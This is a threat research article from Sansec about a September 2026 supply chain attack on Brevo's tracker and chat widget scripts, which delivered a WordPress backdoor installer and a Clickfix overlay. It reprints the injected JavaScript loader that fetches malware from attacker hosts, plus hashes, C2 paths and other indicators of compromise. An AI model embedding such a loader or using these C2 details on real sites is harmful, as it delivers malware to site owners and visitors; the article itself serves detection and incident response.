---
title: Brevo supply chain attack hits 100k+ sites with Wordpress backdoors and Clickfix malware
author: Sansec Forensics Team
url: https://sansec.io/research/brevo-supply-chain-attack
hostname: sansec.io
description: The recent Brevo security incident is much larger than reported. Sansec found that attackers piggy-backed on embedded Brevo widgets to install Wordpress malw...
sitename: Sansec
date: "2026-09-16"
categories: ['Threat Research']
tags: ['brevo, kongtuke, sendinblue, clickfix, sendibt1.com, cdn.sendibt1.com, sdk-loader.js, brevo-conversations.js, brevo breach, brevo saml sso, clipboard hijack, supply chain attack, csp monitoring', 'supply-chain-attack', 'clickfix', 'brevo', 'malware']
---
# Brevo supply chain attack hits 100k+ sites with Wordpress backdoors and Clickfix malware

by Sansec Forensics Team

Published in [Threat Research](https://sansec.io/research) − September 16, 2026

The recent Brevo security incident is much larger than reported. Sansec found that attackers piggy-backed on embedded Brevo widgets to install Wordpress malware on Brevo customer sites and launch Clickfix attacks against their visitors.

Brevo (aka Sendinblue) lists eBay, Louis Vuitton, Michelin and Amnesty International as its clients. It [disclosed](https://status.brevo.com/incidents/pawbvhq8/write-up) ([copy](https://archive.is/iH7HQ)) a security incident on 10 September, claiming that 6 customer accounts were hijacked. But four days later, a much larger breach hit all of their customers.

On 14 September, Brevo served malware to visitors of its own site and [more than 100 thousand](https://publicwww.com/websites/%22brevo.com%22+%7C+%22sibforms.com%22+%7C+%22sibautomation.com%22/) customer sites. The malware had two components:

- a malicious Wordpress plugin, installed when site admins visited their own site
- a [clickfix overlay](https://x.com/calgarywebdev/status/2099554610742718667) , shown to everyone browsing a customer site or clicking an (unsubscribe) link in a Brevo-sent campaign email

## Evidence and scope

Brevo's own pages served an injected `<script>`. We confirmed it on `www.brevo.com` ([urlscan](https://urlscan.io/result/01a0a172-8e50-7679-b9b6-d4dcffb54b81/)), on `meet.brevo.com` booking pages, on the `conversations-widget.brevo.com` iframe page that backs the chat widget, and on the `sibforms.com` pages that serve hosted signup and unsubscribe forms:

```
<script src="https://cdn9.sendibt1.com/f.js" async data-cfasync="false"></script>
```
Then there are two JavaScript assets that merchants embed on their own sites (a tracker and a chat widget):

```
https://cdn.brevo.com/js/sdk-loader.js
https://cdn.brevo.com/js/brevo-conversations.js
```
Verified copies: `sdk-loader.js` pointing at `cdn2` ([16:10:27](https://urlscan.io/result/01a0a0ae-f872-77ea-828f-984dd3d731d5/), [19:56:00](https://urlscan.io/result/01a0a17d-7443-743f-b9a1-79051ff3d9c8/)) and at `cdn11` ([18:23:11](https://urlscan.io/result/01a0a128-8b87-704b-af09-ab137483571e/)), and `brevo-conversations.js` pointing at `cdn4` ([17:27:25](https://urlscan.io/result/01a0a0f5-76ad-70c2-a610-ea7ec2ed7f91/)). They got an extra line that loaded the actual malware:

```
(function () {
  var s = document.createElement("script");
  s.src = "https://cdn2.sendibt1.com/f.js";
  s.async = true;
  var h = document.head || document.documentElement;
  h.appendChild(s);
})();
```
These loader domains vary:

```
cdn.sendibt1.com
cdn2.sendibt1.com
cdn3.sendibt1.com
cdn4.sendibt1.com
cdn9.sendibt1.com
cdn10.sendibt1.com
cdn11.sendibt1.com
```
An SSL certificate for `cdn.sendibt1.com` was created on August 25th. Because `sendibt1.com` is owned and operated by Brevo, this shows that the attacker had write access to Brevo's DNS records.

Brevo served the malware between 16:05:18 and 20:12:53 UTC on 14 September. Sansec's CSP monitor recorded 2,549 violation reports across 12 sites in and after that window.

Everything is clean at origin now and every malicious host stopped resolving on 15 September. Brevo has not released further communication.

## Malware analysis

See the [source](https://urlscan.io/responses/15b85c574f41c9536af0a7931a093d0553b95f5e9860d5a6bff92a3dc3726fb1/) and our [deobfuscated copy](https://deobfuscate.run/app/15b85c574f41c953) of the `f.js` malware.

Two functions:

1. Is the site visitor logged in on Wordpress? Then secretly install a Wordpress plugin from `https://cdn10.sendibt1.com/p/wm.zip` . We didn't recover this plugin, but it's likely a backdoor.
2. Otherwise show the visitor a clickfix overlay (urging the person to prove that they're human by copy-pasting a command)

The malware does not activate for crawlers, developers and automated scanners.

## Possible root cause

There are a couple of hints that suggest that the attackers breached Brevo's Cloudflare account:

1. The modified assets at [cdn.brevo.com](http://cdn.brevo.com) have been serving the same`Last-Modified` dates, before, during and after the incident.
2. The five Brevo apex domains all use Cloudflare DNS: `brevo.com` ,`sibforms.com` ,`sibautomation.com` ,`sendinblue.com` and`sendibt1.com` . This suggests a single Cloudflare account holding all of them,`sendibt1.com` included. That is the zone where the attacker created the`cdn*` records. One account compromise would grant both the DNS writes and the ability to rewrite responses across those zones.
3. `sendibt1.com` itself is not proxied, answering on Brevo's own`172.246.243.65` in AS200484 with`server: envoy` , while only the attacker's`cdn*` records were placed behind the proxy.

Cloudflare Workers or a Snippet support transforming content [dynamically](https://developers.cloudflare.com/workers/runtime-apis/html-rewriter/).

## What Brevo customers should do

Brevo is no longer serving malicious code. However, your Wordpress site may have been backdoored and your customers may have fallen for the Clickfix scam.

Search your access log for a `POST` to `/wp-admin/update.php?action=upload-plugin` that day, and for a `GET` to `/wp-admin/plugins.php?action=activate` shortly after. Check for any plugin whose install or activation date is 14 September. Compare the plugin directory on disk against what the admin screen lists, because a plugin can hide itself from that screen.

If you run the Brevo tracker, the chat widget or a hosted Brevo form, your site was serving an affected file between 16:05 and 20:13 UTC on 14 September. Anyone who saw a full-page "verify you are human" prompt on a site and followed its instructions ran a malicious command on their own machine. These people should urgently run an anti-virus scan.

## Indicators of compromise

```
# Modified files, sha256 (clean at origin since 15 September 2026)
https://cdn.brevo.com/js/sdk-loader.js
  fe8447fd1ec4dca652b71db2c749fcc24a5bec3875f3654042169fb2418aed09   clean, 3442 B
  58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308   injected -> cdn2
  f67d572d2d30407b3f470904326411450763108980cdad89550fbb221fb06782   injected -> cdn11
https://conversations-widget.brevo.com/brevo-conversations.js
  26166cd87ff07e7a50317a24126d14b262e842c5715585636dee3ab3f227ddca   clean, 72816 B
  9b62c12bc5c7feb9802f58e6cf75a368690df3c754e37cc64483a92acacf87a5   injected -> cdn4
# The appended line (final line of each file, hostname varies)
;(function(){var s=document.createElement("script");s.src="https://cdn2.sendibt1.com/f.js";
s.async=true;var h=document.head||document.documentElement;h.appendChild(s)})();
# Malware hosts (all NXDOMAIN since 15 September 2026)
cdn.sendibt1.com       104.21.77.104    created 2026-08-25 17:08 UTC
cdn2.sendibt1.com
cdn3.sendibt1.com
cdn4.sendibt1.com
cdn9.sendibt1.com      188.114.97.3     first observed 2026-09-14
cdn10.sendibt1.com
cdn11.sendibt1.com
# C2 paths, relative to the malware host
/f.js                             the loader
/api/v1/0044d4a                   fingerprint POST      cdn, cdn2, cdn11
/api/v1/e08a3c4                   proof-of-work token   cdn, cdn2, cdn11
/api/v1/8e4c615                   fingerprint POST      cdn3
/api/v1/f659473                   proof-of-work token   cdn3
/api/v1/4aff112?tk=               clipboard command
/api/v1/b832c14?e=                event beacon (click, copy, fallback, failure, close)
/api/v1/4ead0ff?tk=               image beacon
/image.php?tk=                    image beacon
# Kit fingerprints
script[src*="file.js"]            self-location selector, file.js is the kit default
script[data-c]                    self-location fallback, the attribute the injection sets
# C2 cloak response, identical across every host and every observed scan
4af488d79aef7daa12b1c18f0cce28b7edadccb8b6b0fb8d50d1d53a9a7c2df7
  {"s":0,"r":"https:\/\/www.google.com"}
# Do not block
sendibt1.com     The apex is legitimate Brevo email tracking. Maltrail listed
                 it on 15 September alongside the malicious subdomains and
                 removed it on 16 September. Blocking it breaks open and click
                 statistics for every Brevo customer.
```
## Timeline

| Date | Event | 
|---|---|
| 2026-08-25 17:08 | `cdn.sendibt1.com` created, per[Certificate Transparency](https://crt.sh/?q=cdn.sendibt1.com) | 
| 2026-09-10 06:30 | Brevo identifies the SSO flaw, per its [write-up](https://status.brevo.com/incidents/pawbvhq8/write-up) | 
| 2026-09-10 08:30 | Attacker loses access in Brevo's SSO incident, per Brevo's [write-up](https://status.brevo.com/incidents/pawbvhq8/write-up) | 
| 2026-09-14 16:04:23 | Last clean `sdk-loader.js` observed | 
| 2026-09-14 16:05:18 | First malicious `sdk-loader.js` observed | 
| 2026-09-14 20:12:53 | Last malware activity from a Brevo domain | 
| 2026-09-15 | Every malicious host stops resolving | 
| 2026-09-15 11:41 | [Maltrail adds](https://github.com/stamparm/trails/commit/94145a72249633b4244b956c0e59c4ae8d481706)`cdn9` ,`cdn10` ,`cdn11` and the apex`sendibt1.com` | 
| 2026-09-15 17:45 | Last CSP report from a cached copy, about 21 hours after the window closed | 
| 2026-09-16 | Sansec publishes this analysis | 
| 2026-09-16 20:19 | [Maltrail removes](https://github.com/stamparm/trails/commit/900927637da1d9589b36e6eeb198b1979d18e466) the apex`sendibt1.com` .`cdn9` ,`cdn10` and`cdn11` stay listed | 

## Credits

Thanks to [ParadoxLabs](https://paradoxlabs.com) for escalating the Sansec alert to us.

## Read more

##### In this article

##### Protect your store now!

Block all known Magento attacks, while you schedule the latest critical patch until a convenient moment. No more downtime and instability from rushed patching.

[Get Sansec Shield](https://sansec.io/shield)

## Scan your store now

for malware & vulnerabilities

[eComscan](https://sansec.io/#ecomscan) is the most thorough security scanner for Magento, Adobe Commerce, Shopware, WooCommerce, Sylius and many more.

[Learn more](https://sansec.io/#ecomscan)
